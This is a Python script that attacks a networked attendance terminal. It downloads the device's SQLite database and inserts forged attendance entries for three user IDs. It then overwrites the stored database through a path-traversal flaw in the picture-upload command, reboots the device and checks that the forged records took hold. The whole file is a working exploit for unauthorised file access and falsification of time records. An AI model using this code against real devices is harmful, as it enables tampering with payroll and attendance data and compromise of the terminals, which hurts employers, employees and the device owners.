#!/usr/bin/env python3
"""Final ATTLOG injection: download ZKDB, inject, upload back."""
import sys
sys.path.insert(0, 'D:\\chamcong\\AttendanceSuite_Portable\\python\\Lib\\site-packages')
sys.stdout.reconfigure(encoding='utf-8')

import socket, struct, time, sqlite3, os
from datetime import datetime
from zk import ZK, const
from struct import pack, unpack

DEVICE_IP = '172.16.0.214'
OUT_DIR = 'D:\\chamcong\\zk_inject_workspace'

def send_cmd(conn, command, data=b''):
    try:
        return conn._ZK__send_command(command, data, response_size=1024)
    except Exception as e:
        return {'status': False, 'error': str(e)}

def upload_via_picture(conn, target_filename, data):
    traversal = ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + target_filename
    filename = traversal.encode() + b'\x00'
    size = len(data)
    r1 = send_cmd(conn, const.CMD_PREPARE_DATA, pack('I', size))
    if not r1.get('status'):
        return {'error': 'PREPARE', 'r1': r1}
    MAX_CHUNK = 1024
    remain = size % MAX_CHUNK
    packets = (size - remain) // MAX_CHUNK
    for i in range(packets):
        r = send_cmd(conn, const.CMD_DATA, data[i*MAX_CHUNK:(i+1)*MAX_CHUNK])
        if not r.get('status'): return {'error': 'chunk'}
    if remain:
        r = send_cmd(conn, const.CMD_DATA, data[packets*MAX_CHUNK:])
    r3 = send_cmd(conn, 0x272B, filename)
    return {'PREPARE': r1, 'UPLOAD': r3}

def download_zkdb(conn, output_path, timeout_s=90):
    sock = conn._ZK__sock
    r = send_cmd(conn, 0x6A6, b'/mnt/mtdblock/data/ZKDB.db\x00')
    print('  READFILE:', r)
    sock.settimeout(20)
    total = b''
    chunks = 0
    start = time.time()
    while time.time() - start < timeout_s:
        try:
            chunk = sock.recv(65536)
            if not chunk: break
            if len(chunk) >= 16:
                top1, top2, tcp_len = unpack('<HHI', chunk[:8])
                zk_cmd = unpack('<H', chunk[8:10])[0]
                body = chunk[16:16+(tcp_len - 8)] if tcp_len > 8 else b''
                total += body
                chunks += 1
                if zk_cmd == 0x07D0 or zk_cmd == 2000:
                    print('  [DONE] {} chunks, {} bytes'.format(chunks, len(total)))
                    break
                if chunks % 100 == 0:
                    print('  ...{} chunks, {} bytes'.format(chunks, len(total)))
        except socket.timeout:
            print('  [TIMEOUT] after {} chunks'.format(chunks))
            break
    with open(output_path, 'wb') as f:
        f.write(total)
    return total

os.makedirs(OUT_DIR, exist_ok=True)

zk = ZK(DEVICE_IP, port=4370, timeout=20, password=0)
conn = zk.connect()
print('[+] Connected:', conn.get_firmware_version())

try:
    before_att = conn.get_attendance_count()
    print('[*] BEFORE ATTLOG:', before_att)
except: before_att = None

try: conn.disable_device()
except: pass

# Step 1: Download
print('\n[*] Downloading ZKDB.db (max 90s)...')
db_path = os.path.join(OUT_DIR, 'before_inject.db')
zkdb = download_zkdb(conn, db_path, timeout_s=90)

if not zkdb or zkdb[:15] != b'SQLite format 3':
    print('[!] Download failed or invalid')
    exit(1)

print('[*] Got {} bytes'.format(len(zkdb)))

# Step 2: Inject
print('\n[*] Injecting ATTLOG records...')
try:
    db = sqlite3.connect(db_path)
    cur = db.cursor()
    cur.execute('SELECT COUNT(*) FROM ATT_LOG')
    old = cur.fetchone()[0]
    test_time = datetime.now().strftime('%Y-%m-%dT%H:%M:%S')
    pins = ['1', '47', '1383']
    for pin in pins:
        cur.execute('''INSERT INTO ATT_LOG (User_PIN, Verify_Type, Verify_Time, Status, Work_Code_ID, Sensor_NO, Att_Flag, CREATE_ID, MODIFY_TIME, SEND_FLAG)
                      VALUES (?, 1, ?, 0, 0, 0, 0, NULL, NULL, 0)''', (pin, test_time))
    cur.execute('SELECT COUNT(*) FROM ATT_LOG')
    new = cur.fetchone()[0]
    print('  Injected 3 records: {} -> {}'.format(old, new))
    db.commit()
    db.close()
except Exception as e:
    print('[!] Inject:', e)
    exit(1)

with open(db_path, 'rb') as f:
    modified = f.read()

# Step 3: Upload back
print('\n[*] Uploading modified ZKDB.db...')
result = upload_via_picture(conn, 'mnt/mtdblock/data/ZKDB.db', modified)
print('  Result:', result)

# Step 4: Reboot
print('\n[*] Rebooting...')
try: conn.restart()
except Exception as e: print('  Restart err:', e)

try: conn.enable_device()
except: pass
try: conn.disconnect()
except: pass

# Step 5: Wait + verify
print('\n[*] Waiting 20s for reboot...')
time.sleep(20)

print('[*] Reconnecting...')
try:
    zk2 = ZK(DEVICE_IP, port=4370, timeout=15, password=0)
    conn2 = zk2.connect()
    after_att = conn2.get_attendance_count()
    print('[*] AFTER ATTLOG:', after_att)
    if before_att is not None:
        delta = after_att - before_att
        print('  Delta: {:+d}'.format(delta))
        if delta >= 3:
            print('\n  [+] ATTLOG INJECTION SUCCESS!')
        elif delta == 0:
            print('\n  [?] NO CHANGE - device may have rejected upload or kept old DB')
        else:
            print('\n  [!] UNEXPECTED DELTA')
    conn2.disconnect()
except Exception as e:
    print('[!] Reconnect:', e)

print('\n[+] Done')
